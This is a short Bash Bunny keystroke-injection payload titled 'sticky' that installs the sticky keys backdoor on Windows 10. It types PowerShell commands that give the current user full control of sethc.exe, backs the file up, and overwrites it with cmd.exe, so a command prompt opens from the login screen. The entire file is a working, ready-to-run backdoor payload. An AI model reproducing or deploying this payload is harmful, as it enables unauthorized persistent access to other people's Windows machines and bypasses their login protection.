#!/bin/bash
#
#Title: sticky
#Author: Parad0x01 (Logan Elliott)
#Version: 0.1
#Plug2Pwn: Unknown
#
# Creates a sticky keys backdoor on Windows 10
#
# White = Give Permissions for sethc.exe to current user
# Magenta = Copy over CMD to SETHC.EXE

#Give Permissions for sethc.exe to current user
ATTACKMODE HID
LED W 500 
Q STRING "\$Acl = Get-Acl sethc.exe"
Q ENTER
Q DELAY 100
Q STRING "\$Ar = New-Object  system.security.accesscontrol.filesystemaccessrule(\$env:UserName,\"FullControl\",\"Allow\")"
Q ENTER
Q DELAY 100
Q STRING "\$Acl.SetAccessRule(\$Ar)"
Q ENTER
Q DELAY 100
Q STRING "Set-Acl sethc.exe \$Acl"
Q ENTER
Q DELAY 100


#Copy over CMD to SETHC.EXE (Save sethc.exe as sethc.exe.bak if you want to be nice)
LED M 500
Q STRING "xcopy sethc.exe sethc.exe.bak"
Q ENTER 
Q DELAY 1200
Q STRING "F"
Q DELAY 100
Q STRING "xcopy cmd.exe sethc.exe"
Q ENTER
Q DELAY 200
Q STRING "Y"
Q ENTER
Q DELAY 200

#Done
LED G
